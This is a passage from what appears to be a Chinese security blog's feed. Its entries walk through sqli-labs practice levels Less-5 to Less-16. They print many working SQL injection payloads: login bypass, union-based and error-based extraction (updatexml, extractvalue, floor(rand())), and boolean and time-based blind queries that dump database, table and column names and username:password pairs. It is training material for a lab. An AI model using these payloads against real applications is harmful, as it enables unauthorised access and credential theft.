src="/2022/02/05/POST%E6%B3%A8%E5%85%A5-%E5%9F%BA%E4%BA%8EPassword%E7%9A%84%E6%B3%A8%E5%85%A5/image-20220205140542450.png" alt="image-20220205140542450"></p><h2 id="0x03"><a href="#0x03" class="headerlink" title="0x03"></a>0x03</h2><p>在passwd处构造payload进行报错注入：</p><pre class="line-numbers language-none"><code class="language-none">uname&#x3D;admin  &amp;passwd&#x3D;1&#39; or extractvalue(1,concat(0x7e,(select database()),0x7e)) #<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2022/02/05/POST%E6%B3%A8%E5%85%A5-%E5%9F%BA%E4%BA%8EPassword%E7%9A%84%E6%B3%A8%E5%85%A5/image-20220205140826696.png" alt="image-20220205140826696"></p><p>其他payload类似。</p><h2 id="0x04"><a href="#0x04" class="headerlink" title="0x04"></a>0x04</h2><p>这里还需要注意其他几个函数：</p><p>1、增加一行数据：<strong>Insert</strong></p><p>例：insert into users values(‘15’,’xiaobai’,’xiaobai’);</p><p><img src="/2022/02/05/POST%E6%B3%A8%E5%85%A5-%E5%9F%BA%E4%BA%8EPassword%E7%9A%84%E6%B3%A8%E5%85%A5/image-20220205142153374.png" alt="image-20220205142153374"></p><p>2、<strong>delete</strong>：</p><p>删除：</p><p>删数据: </p><p>delete from 表名; </p><p>delete from 表名 where id&#x3D;1; </p><p>删除结构： </p><p>删数据库：drop database 数据库名; </p><p>删除表：drop table 表名; </p><p>删除表中的列:alter table 表名 drop column列名;</p><p>例：delete from users where id&#x3D;15；</p><p><img src="/2022/02/05/POST%E6%B3%A8%E5%85%A5-%E5%9F%BA%E4%BA%8EPassword%E7%9A%84%E6%B3%A8%E5%85%A5/image-20220205142551573.png" alt="image-20220205142551573"></p><p><img src="/2022/02/05/POST%E6%B3%A8%E5%85%A5-%E5%9F%BA%E4%BA%8EPassword%E7%9A%84%E6%B3%A8%E5%85%A5/image-20220205142607603.png" alt="image-20220205142607603"></p><p>3、<strong>update</strong>：修改</p><p>修改所有：updata 表名 set 列名&#x3D;’新的值，非数字加单引号’ ;</p><p>带条件的修改：updata 表名 set 列名&#x3D;’新的值，非数字加单引号’ where id&#x3D;6</p><p>例：update users set username&#x3D;’tt’ where id&#x3D;15;</p>]]></content>
      
      
      <categories>
          
          <category> SQL注入 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SQL注入 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SQL注入-POST注入</title>
      <link href="/2022/02/05/SQL%E6%B3%A8%E5%85%A5-POST%E6%B3%A8%E5%85%A5/"/>
      <url>/2022/02/05/SQL%E6%B3%A8%E5%85%A5-POST%E6%B3%A8%E5%85%A5/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p>[TOC]</p><h2 id="0x00"><a href="#0x00" class="headerlink" title="0x00"></a>0x00</h2><p>POST注入，就是数据从客户端提交 到服务器端，例如我们在登录过程中，输入用户名和密码，用户名</p><p>和密码以表单的形式提交， 提交到服务器后服务器再进行验证。这就是一次 post的过程。</p><h2 id="Less-11"><a href="#Less-11" class="headerlink" title="Less-11"></a>Less-11</h2><p>当在输入框输入正确的用户名和密码后，显示登录成功</p><p><img src="/2022/02/05/SQL%E6%B3%A8%E5%85%A5-POST%E6%B3%A8%E5%85%A5/image-20220205092829849.png" alt="image-20220205092829849"></p><h2 id="0x01"><a href="#0x01" class="headerlink" title="0x01"></a>0x01</h2><p>接下来就要探测注入点：</p><p>当输入<code>admin&#39; --+ 123</code>,出现以下报错，可得知单引号报错；</p><p><img src="/2022/02/05/SQL%E6%B3%A8%E5%85%A5-POST%E6%B3%A8%E5%85%A5/image-20220205101856621.png" alt="image-20220205101856621"></p><p>注入以下语句：</p><pre class="line-numbers language-none"><code class="language-none">admin&#39; or &#39;1&#39;&#x3D;&#39;1 --+123（密码随意）<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>登录正常。</p><p><img src="/2022/02/05/SQL%E6%B3%A8%E5%85%A5-POST%E6%B3%A8%E5%85%A5/image-20220205102713002.png" alt="image-20220205102713002"></p><h2 id="0x02"><a href="#0x02" class="headerlink" title="0x02"></a>0x02</h2><p>猜解字段数：</p><p>执行以下语句：</p><pre class="line-numbers language-none"><code class="language-none">admin&#39; order by 3 #sss（密码随意）<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>出现报错</p><p><img src="/2022/02/05/SQL%E6%B3%A8%E5%85%A5-POST%E6%B3%A8%E5%85%A5/image-20220205104619269.png" alt="image-20220205104619269"></p><pre class="line-numbers language-none"><code class="language-none">admin&#39; order by 2 #123<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>登录正常，有两个字段</p><p><img src="/2022/02/05/SQL%E6%B3%A8%E5%85%A5-POST%E6%B3%A8%E5%85%A5/image-20220205104918157.png" alt="image-20220205104918157"></p><h2 id="0x03"><a href="#0x03" class="headerlink" title="0x03"></a>0x03</h2><p>判断回显点：</p><pre class="line-numbers language-none"><code class="language-none">-admin&#39; union select 1,2#<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2022/02/05/SQL%E6%B3%A8%E5%85%A5-POST%E6%B3%A8%E5%85%A5/image-20220205105159013.png" alt="image-20220205105159013"></p><h2 id="0x04"><a href="#0x04" class="headerlink" title="0x04"></a>0x04</h2><p>爆库名：</p><pre class="line-numbers language-none"><code class="language-none">-admin&#39; union select 1,database() #<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2022/02/05/SQL%E6%B3%A8%E5%85%A5-POST%E6%B3%A8%E5%85%A5/image-20220205105334082.png" alt="image-20220205105334082"></p><p>后续注入同GET方式的payload。</p><h2 id="Less-12"><a href="#Less-12" class="headerlink" title="Less-12"></a>Less-12</h2><p>输入<code>admin&quot;</code>出现报错，基于<code>&quot;)</code>的报错</p><p><img src="/2022/02/05/SQL%E6%B3%A8%E5%85%A5-POST%E6%B3%A8%E5%85%A5/image-20220205120713625.png" alt="image-20220205120713625"></p><p>同样，类似Less-11探测注入点：</p><pre class="line-numbers language-none"><code class="language-none">uname&#x3D;admin&quot;) or 1&#x3D;1 #&amp;passwd&#x3D;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>登录成功</p><p><img src="/2022/02/05/SQL%E6%B3%A8%E5%85%A5-POST%E6%B3%A8%E5%85%A5/image-20220205121017130.png" alt="image-20220205121017130"></p><p>探测字段数：</p><pre class="line-numbers language-none"><code class="language-none">uname&#x3D;admin&quot;)  order by 2 #&amp;passwd&#x3D;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2022/02/05/SQL%E6%B3%A8%E5%85%A5-POST%E6%B3%A8%E5%85%A5/image-20220205121119677.png" alt="image-20220205121119677"></p><p>探测回显点：</p><pre class="line-numbers language-none"><code class="language-none">uname&#x3D;-admin&quot;)  union select  1,2 #&amp;passwd&#x3D;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>使用<code>union</code>字段一定要将开始查询的字段报错：<code>-admin&quot;)</code></p><p><img src="/2022/02/05/SQL%E6%B3%A8%E5%85%A5-POST%E6%B3%A8%E5%85%A5/image-20220205121257596.png" alt="image-20220205121257596"></p><p>后续过程同以往payload。</p><h2 id="Less-13"><a href="#Less-13" class="headerlink" title="Less-13"></a>Less-13</h2><p>输入<code>admin&#39;</code>出现报错，基于<code>&#39;)</code>的报错</p><p><img src="/2022/02/05/SQL%E6%B3%A8%E5%85%A5-POST%E6%B3%A8%E5%85%A5/image-20220205121755152.png" alt="image-20220205121755152"></p><p>探测注入点：</p><pre class="line-numbers language-none"><code class="language-none">uname&#x3D;admin&#39;) or 1&#x3D;1#&amp;passwd&#x3D;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>登录成功，无回显。</p><p><img src="/2022/02/05/SQL%E6%B3%A8%E5%85%A5-POST%E6%B3%A8%E5%85%A5/image-20220205121951700.png" alt="image-20220205121951700"></p><p>在探测回显点时，注入：</p><pre class="line-numbers language-none"><code class="language-none">uname&#x3D;admin&#39;)  union select 1,2#&amp;passwd&#x3D;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>同样无回显：</p><p><img src="/2022/02/05/SQL%E6%B3%A8%E5%85%A5-POST%E6%B3%A8%E5%85%A5/image-20220205122814971.png" alt="image-20220205122814971"></p><p>这时候首先想到的是盲注，先用报错盲注试验一下：</p><pre class="line-numbers language-none"><code class="language-none">uname&#x3D;admin&#39;)  and updatexml(1,concat(0x7e,(select database()),0x7e),1)#&amp;passwd&#x3D;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>果然，爆出数据库。</p><p><img src="/2022/02/05/SQL%E6%B3%A8%E5%85%A5-POST%E6%B3%A8%E5%85%A5/image-20220205122717739.png" alt="image-20220205122717739"></p><p>爆表名：</p><pre class="line-numbers language-none"><code class="language-none">uname&#x3D;admin&#39;)  and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema&#x3D;&#39;security&#39; limit 0,1),0x7e),1)#&amp;passwd&#x3D;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2022/02/05/SQL%E6%B3%A8%E5%85%A5-POST%E6%B3%A8%E5%85%A5/image-20220205123107133.png" alt="image-20220205123107133"></p><p>爆字段：</p><pre class="line-numbers language-none"><code class="language-none">uname&#x3D;admin&#39;)  and updatexml(1,concat(0x7e,(select column_name from information_schema.columns where table_name&#x3D;&#39;users&#39; limit 4,1),0x7e),1)#&amp;passwd&#x3D;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">uname&#x3D;admin&#39;)  and updatexml(1,concat(0x7e,(select column_name from information_schema.columns where table_name&#x3D;&#39;users&#39; limit 5,1),0x7e),1)#&amp;passwd&#x3D;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>爆内容：</p><pre class="line-numbers language-none"><code class="language-none">uname&#x3D;admin&#39;)  and updatexml(1,concat(0x7e,(select concat(username,&#39;:&#39;,password) from users limit 0,1),0x7e),1)#&amp;passwd&#x3D;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>这里还可以使用其他的盲注进行测试。其他的payload见Less-5。</p><h2 id="Less-14"><a href="#Less-14" class="headerlink" title="Less-14"></a>Less-14</h2><p>输入<code>admin&quot;</code>,报错，对id进行了<code>&quot;</code>处理</p><p><img src="/2022/02/05/SQL%E6%B3%A8%E5%85%A5-POST%E6%B3%A8%E5%85%A5/image-20220205123906183.png" alt="image-20220205123906183"></p><p>探测注入点：</p><pre class="line-numbers language-none"><code class="language-none">uname&#x3D;admin&quot; or 1&#x3D;1 #&amp;passwd&#x3D;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>登录成功，同样无回显。</p><p><img src="/2022/02/05/SQL%E6%B3%A8%E5%85%A5-POST%E6%B3%A8%E5%85%A5/image-20220205124221653.png" alt="image-20220205124221653"></p><p>这里应该和Less-13一样，同样都是盲注：</p><pre class="line-numbers language-none"><code class="language-none">uname&#x3D;admin&quot; union select count(*),concat((select database()),floor(rand()*2)) a from information_schema.schemata  group by a #&amp;passwd&#x3D;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>使用floor()函数报错，爆出数据库</p><p><img src="/2022/02/05/SQL%E6%B3%A8%E5%85%A5-POST%E6%B3%A8%E5%85%A5/image-20220205124636640.png" alt="image-20220205124636640"></p><pre class="line-numbers language-none"><code class="language-none">uname&#x3D;admin&quot; or if(length(version())&gt;6, 1, sleep(5)) #&amp;passwd&#x3D;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>时间盲注，猜测版本号，等待响应，版本号不大于6</p><p><img src="/2022/02/05/SQL%E6%B3%A8%E5%85%A5-POST%E6%B3%A8%E5%85%A5/image-20220205125050833.png" alt="image-20220205125050833"></p><p>其他payload同以往。</p><p>##Less-15</p><p>输入<code>admin&#39;</code>登录失败 ，输入<code>admin&#39; or 1=1#</code>登录成功，但都无回显，无报错，结合源代码，这里对于id进行了<code>&#39;</code>处理，试验报错盲注，发现没有任何变化 ，而且还是登录失败的界面：</p><pre class="line-numbers language-none"><code class="language-none">uname&#x3D;admin&#39; or updatexml(1,concat(0x7e,select database(),0x7e),1)   #&amp;passwd&#x3D;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2022/02/05/SQL%E6%B3%A8%E5%85%A5-POST%E6%B3%A8%E5%85%A5/image-20220205130653538.png" alt="image-20220205130653538"></p><p>报错盲注应该在这里不行，试试盲注。</p><pre class="line-numbers language-none"><code class="language-none">uname&#x3D;admin&#39; or if(length(version())&gt;5,1,sleep(5)) #&amp;passwd&#x3D;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>时间盲注探测数据库版本，回显登录正确；</p><p><img src="/2022/02/05/SQL%E6%B3%A8%E5%85%A5-POST%E6%B3%A8%E5%85%A5/image-20220205130915677.png" alt="image-20220205130915677"></p><pre class="line-numbers language-none"><code class="language-none">uname&#x3D;admin&#39; or ascii(substr(database(),1,1))&#x3D;115 #&amp;passwd&#x3D;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>布尔盲注探测数据库第一位字符，回显登录正确。</p><p><img src="/2022/02/05/SQL%E6%B3%A8%E5%85%A5-POST%E6%B3%A8%E5%85%A5/image-20220205131312857.png" alt="image-20220205131312857"></p><p>其他payload见以往。</p><h2 id="Less-16"><a href="#Less-16" class="headerlink" title="Less-16"></a>Less-16</h2><p>根据源码，这里对id进行了<code>&quot;)</code>的处理，其他payload与Less-15相同。</p>]]></content>
      
      
      <categories>
          
          <category> SQL注入 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SQL注入 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SQL注入-Less8-Less10</title>
      <link href="/2022/02/04/SQL%E6%B3%A8%E5%85%A5-Less8-Less10/"/>
      <url>/2022/02/04/SQL%E6%B3%A8%E5%85%A5-Less8-Less10/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p>[TOC]</p><h2 id="0x00"><a href="#0x00" class="headerlink" title="0x00"></a>0x00</h2><p>记录一下Less-8—Less10盲注遇到的一些问题</p><h2 id="0x01"><a href="#0x01" class="headerlink" title="0x01"></a>0x01</h2><p>首先8-10关最大特点就是没有报错回显，导致开始注入的时候都是利用报错注入，结果统统失败，后来查看源码发现，报错回显被注释掉了，那这几关报错盲注就不能用了，只能用布尔盲注和时间盲注。</p><p><img src="/2022/02/04/SQL%E6%B3%A8%E5%85%A5-Less8-Less10/image-20220204003814683.png" alt="image-20220204003814683"></p><h2 id="0x02"><a href="#0x02" class="headerlink" title="0x02"></a>0x02</h2><p>其次就是注入点的问题，Less-8是单引号的布尔盲注，Less-9是单引号的时间盲注，Less-10是双引号的时间盲注，每次注入的时候探测注入很关键，这也是每次注入的时候我老是忽略的问题。</p><h2 id="0x03"><a href="#0x03" class="headerlink" title="0x03"></a>0x03</h2><p>然后就是对于布尔盲注和时间盲注时，猜表名和猜列名遇到的问题；由于猜表名的时候根据以往的回显表示：子查询超过一行的报错，以至于这几关每次注入的时候老是缺少<code>limit</code>字段，而且又是盲注的无回显，导致每次出问题都不知道在哪里，仔细一看才知道没加<code>limit</code>字段。</p><pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;sqli-labs-master&#x2F;Less-8&#x2F;?id&#x3D;1&#39; and if(ascii(substr((select table_name from information_schema.tables where table_schema&#x3D;&#39;security&#39; limit 1,1),1,1))&#x3D;116,1,sleep(5)) --+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="0x04"><a href="#0x04" class="headerlink" title="0x04"></a>0x04</h2><p>Less-9和Less-10最大的特点就是：时间盲注的时候，不管怎么注入都只出现You are in………..，但是浏览器会响应，如图：</p><p><img src="/2022/02/04/SQL%E6%B3%A8%E5%85%A5-Less8-Less10/image-20220204005121825.png" alt="image-20220204005121825"></p><p>看到等待sqli-labs-master的响应…才明白sleep()函数被执行了，但页面会保持不变。</p><h2 id="0x05"><a href="#0x05" class="headerlink" title="0x05"></a>0x05</h2><p>sqli-labs的前十关都是基于GET方式的注入。</p>]]></content>
      
      
      <categories>
          
          <category> SQL注入 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SQL注入 </tag>
            
            <tag> 靶场 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>盲注-SQL靶场</title>
      <link href="/2022/02/02/%E7%9B%B2%E6%B3%A8-SQL%E9%9D%B6%E5%9C%BA/"/>
      <url>/2022/02/02/%E7%9B%B2%E6%B3%A8-SQL%E9%9D%B6%E5%9C%BA/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p>[TOC]</p><h2 id="0x00"><a href="#0x00" class="headerlink" title="0x00"></a>0x00</h2><p>Less-5和Less-6关看了很多文章，总的下来就是布尔盲注，报错注入和时间盲注，通过各种函数进行注入，在这里记录以下。</p><h2 id="0x01（floor-报错）"><a href="#0x01（floor-报错）" class="headerlink" title="0x01（floor()报错）"></a>0x01（floor()报错）</h2><p>首先，开始注入的时候先是按照1-4关的注入方式探测了以下注入点，又看了一下源码，发现源码当中只能输出You are in……….</p><p><img src="/2022/02/02/%E7%9B%B2%E6%B3%A8-SQL%E9%9D%B6%E5%9C%BA/image-20220202202635835.png" alt="image-20220202202635835"></p><p>这时候才发现1-4关的注入方式已经在5关用不了了。</p><p>但这里还是可以判断出字段数的：</p><pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;sqli-labs-master&#x2F;Less-5&#x2F;?id&#x3D;1&#39; order by 3--+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;sqli-labs-master&#x2F;Less-5&#x2F;?id&#x3D;1&#39; order by 4--+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>根据回显，正确时就会返回You are in……….，错误时返回空。</p><p><img src="/2022/02/02/%E7%9B%B2%E6%B3%A8-SQL%E9%9D%B6%E5%9C%BA/image-20220202203008094.png" alt="image-20220202203008094"></p><p><img src="/2022/02/02/%E7%9B%B2%E6%B3%A8-SQL%E9%9D%B6%E5%9C%BA/image-20220202202947666.png" alt="image-20220202202947666"></p><h2 id="0x02"><a href="#0x02" class="headerlink" title="0x02"></a>0x02</h2><p>开始注入以下语句：</p><pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;sqli-labs-master&#x2F;Less-5&#x2F;?id&#x3D;1&#39; union select 1,count(*), concat((select database()),floor(rand()*2)) as  a from information_schema.schemata group by a --+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>第一次点击，回显正常页面</p><p><img src="/2022/02/02/%E7%9B%B2%E6%B3%A8-SQL%E9%9D%B6%E5%9C%BA/image-20220202204824647.png" alt="image-20220202204824647"></p><p>第二次点击，爆出数据库（对于这样的情况需要多点击几次才能得到回显）</p><p><img src="/2022/02/02/%E7%9B%B2%E6%B3%A8-SQL%E9%9D%B6%E5%9C%BA/image-20220202204902893.png" alt="image-20220202204902893"></p><p><img src="/2022/02/02/%E7%9B%B2%E6%B3%A8-SQL%E9%9D%B6%E5%9C%BA/image-20220202210149317.png" alt="image-20220202210149317"></p><p>这里解析以下以上注入语句：</p><p>select database()：查询数据库</p><p>floor(rand()*2)：输出0或1</p><p>concat((select database()),floor(rand()*2))：将查询到的数据库与取整的0或1拼接，如上图</p><p>a：这里的a是将concat((select database()),floor(rand()*2))取的别名，得到的结果是a，此时的a有security0或security1两种情况，如上图</p><p>group by：最后由group by函数将a进行分组，security0一组，security1一组</p><p><strong>floor()函数报错分析：</strong></p><p>　 <strong>因为 rand 函数的特殊性（如果使用rand()的话，该值会被计算多次）。</strong><br>　 <strong>在这里的意思就是，group by 进行分组时，<code>floor(rand(0)*2)</code>执行一次（查看分组是否存在），如果虚拟表中不在在该分组，那么在插入新分组的时候 <code>floor(rand(0)*2)</code> 就又计算了一次。</strong></p><p>　　<strong>当我们使用<code>floor(rand(0)*2)</code>产生0和1两个随机数后，当在<code>group by</code> 对其进行分组的时候，首先遇到第一个值 0 ，发现 0 不存在，于是需要插入分组，就在这时，<code>floor(rand(0)\*2)</code>再次被触发，生成第二个值 1 ，因此最终插入虚拟表的也就是第二个值 1 ；然后遇到第三个值 1 ，因为已经存在分组 1 了，就直接计数加1（这时1的计数变为2）;遇到第四个值 0 的时候，发现 0 不存在，于是又需要插入新分组，然后<code>floor(rand(0)*2)</code>又被触发，生成第五个值 1 ，因此这时还是往虚拟表里插入分组 1 ，但是，分组 1 已经存在了！所以报错！</strong></p><h2 id="0x03"><a href="#0x03" class="headerlink" title="0x03"></a>0x03</h2><p>接下来爆版本号：</p><pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;sqli-labs-master&#x2F;Less-5&#x2F;?id&#x3D;1&#39; union select 1,count(*), concat((select version()),floor(rand()*2)) as  a from information_schema.schemata group by a --+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2022/02/02/%E7%9B%B2%E6%B3%A8-SQL%E9%9D%B6%E5%9C%BA/image-20220202210651585.png" alt="image-20220202210651585"></p><h2 id="0x04"><a href="#0x04" class="headerlink" title="0x04"></a>0x04</h2><p>爆数据库用户名：</p><pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;sqli-labs-master&#x2F;Less-5&#x2F;?id&#x3D;1&#39; union select 1,count(*), concat((select user()),floor(rand()*2)) as  a from information_schema.schemata group by a --+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2022/02/02/%E7%9B%B2%E6%B3%A8-SQL%E9%9D%B6%E5%9C%BA/image-20220202210909030.png" alt="image-20220202210909030"></p><h2 id="0x05"><a href="#0x05" class="headerlink" title="0x05"></a>0x05</h2><p>这里爆表名的时候出现了错误：</p><pre class="line-numbers language-none"><code class="language-none">Subquery returns more than 1 row  子查询返回数据超过1行其实就是子查询返回数据时只能返回一条数据，但由于这里注入返回的结果超过了一行导致报错<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="/2022/02/02/%E7%9B%B2%E6%B3%A8-SQL%E9%9D%B6%E5%9C%BA/image-20220202211656117.png" alt="image-20220202211656117"></p><p>注到这里，看了一下解决Subquery returns more than 1 row的办法，用limit字段限制多余查询</p><p><strong>limit语法：limit M,N 是从第M+1条数据开始查询，查询出N条数据。</strong></p><p>注入语句：</p><pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;sqli-labs-master&#x2F;Less-5&#x2F;?id&#x3D;1&#39; union select 1,count(*), concat((select table_name from information_schema.tables where table_schema&#x3D;&#39;security&#39; limit 0,1 ),floor(rand()*2)) as  a from information_schema.tables  group by a --+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>这里一定要在子查询后面添加<strong>limit 0,1</strong>,如：</p><pre class="line-numbers language-none"><code class="language-none">concat((select table_name from information_schema.tables where table_schema&#x3D;&#39;security&#39; limit 0,1 ),floor(rand()*2))<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2022/02/02/%E7%9B%B2%E6%B3%A8-SQL%E9%9D%B6%E5%9C%BA/image-20220202212813330.png" alt="image-20220202212813330"></p><h2 id="0x06"><a href="#0x06" class="headerlink" title="0x06"></a>0x06</h2><p>爆出所有表名：</p><pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;sqli-labs-master&#x2F;Less-5&#x2F;?id&#x3D;1&#39; union select 1,count(*), concat((select group_concat(table_name) from information_schema.tables where table_schema&#x3D;&#39;security&#39; limit 0,1 ),floor(rand()*2)) as  a from information_schema.tables  group by a --+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2022/02/02/%E7%9B%B2%E6%B3%A8-SQL%E9%9D%B6%E5%9C%BA/image-20220202213030869.png" alt="image-20220202213030869"></p><h2 id="0x07"><a href="#0x07" class="headerlink" title="0x07"></a>0x07</h2><p>爆所有字段：</p><pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;sqli-labs-master&#x2F;Less-5&#x2F;?id&#x3D;1&#39; union select 1,count(*), concat((select group_concat(column_name) from information_schema.columns where table_name&#x3D;&#39;users&#39; limit 0,1 ),floor(rand()*2)) as  a from information_schema.columns  group by a --+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2022/02/02/%E7%9B%B2%E6%B3%A8-SQL%E9%9D%B6%E5%9C%BA/image-20220202213249676.png" alt="image-20220202213249676"></p><h2 id="0x08"><a href="#0x08" class="headerlink" title="0x08"></a>0x08</h2><p>这里要爆用户名的时候同样用了爆列名时候的group_concat()函数，但试了很多次，没有回显用户名数据，只有You are in……….</p><pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;sqli-labs-master&#x2F;Less-5&#x2F;?id&#x3D;1&#39; union select 1,count(*), concat((select group_concat(username) from users limit 0,1 ),floor(rand()*2)) as  a from information_schema.tables  group by a --+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2022/02/02/%E7%9B%B2%E6%B3%A8-SQL%E9%9D%B6%E5%9C%BA/image-20220202214749674.png" alt="image-20220202214749674"></p><p>以至于改成下面的注入语句：</p><p>不过这里只能通过控制<strong>limit字段</strong>来爆出用户名和密码</p><pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;sqli-labs-master&#x2F;Less-5&#x2F;?id&#x3D;1&#39; union select 1,count(*), concat((select concat(username, &#39;:&#39;,password,&#39;;&#39;) from users limit 0,1 ),floor(rand()*2)) as  a from information_schema.tables  group by a --+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2022/02/02/%E7%9B%B2%E6%B3%A8-SQL%E9%9D%B6%E5%9C%BA/image-20220202214631827.png" alt="image-20220202214631827"></p><pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;sqli-labs-master&#x2F;Less-5&#x2F;?id&#x3D;1&#39; union select 1,count(*), concat((select concat(username,&#39;:&#39;,password,&#39;;&#39;) from users limit 1,1 ),floor(rand()*2)) as  a from information_schema.tables  group by a --+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>以此类推。</p><p><img src="/2022/02/02/%E7%9B%B2%E6%B3%A8-SQL%E9%9D%B6%E5%9C%BA/image-20220202215303667.png" alt="image-20220202215303667"></p><hr><h2 id="0x01（无回显的布尔）"><a href="#0x01（无回显的布尔）" class="headerlink" title="0x01（无回显的布尔）"></a>0x01（无回显的布尔）</h2><p>探测数据库版本是否&gt;&#x3D;5，回显正常，数据库版本在5.0以上</p><pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;sqli-labs-master&#x2F;Less-5&#x2F;?id&#x3D;1&#39; and left(version(),1)&gt;&#x3D;5 --+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2022/02/02/%E7%9B%B2%E6%B3%A8-SQL%E9%9D%B6%E5%9C%BA/image-20220202222007795.png" alt="image-20220202222007795"></p><h2 id="0x02-1"><a href="#0x02-1" class="headerlink" title="0x02"></a>0x02</h2><p>利用length()函数探测数据库长度：</p><pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;sqli-labs-master&#x2F;Less-5&#x2F;?id&#x3D;1&#39; and length(database())&#x3D;10 --+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>页面错误，表示数据库长度不是10。</p><p><img src="/2022/02/02/%E7%9B%B2%E6%B3%A8-SQL%E9%9D%B6%E5%9C%BA/image-20220202222342805.png" alt="image-20220202222342805"></p><pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;sqli-labs-master&#x2F;Less-5&#x2F;?id&#x3D;1&#39; and length(database())&#x3D;8 --+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>此时回显正常，数据库长度为8。</p><p><img src="/2022/02/02/%E7%9B%B2%E6%B3%A8-SQL%E9%9D%B6%E5%9C%BA/image-20220202222452003.png" alt="image-20220202222452003"></p><h2 id="0x03-1"><a href="#0x03-1" class="headerlink" title="0x03"></a>0x03</h2><p>猜测数据库名第一位：</p><pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;sqli-labs-master&#x2F;Less-5&#x2F;?id&#x3D;1&#39; and left(database(),1)&gt;&#39;a&#39;--+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2022/02/02/%E7%9B%B2%E6%B3%A8-SQL%E9%9D%B6%E5%9C%BA/image-20220202223235772.png" alt="image-20220202223235772"></p><pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;sqli-labs-master&#x2F;Less-5&#x2F;?id&#x3D;1&#39; and left(database(),1)&gt;&#39;s&#39;--+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img 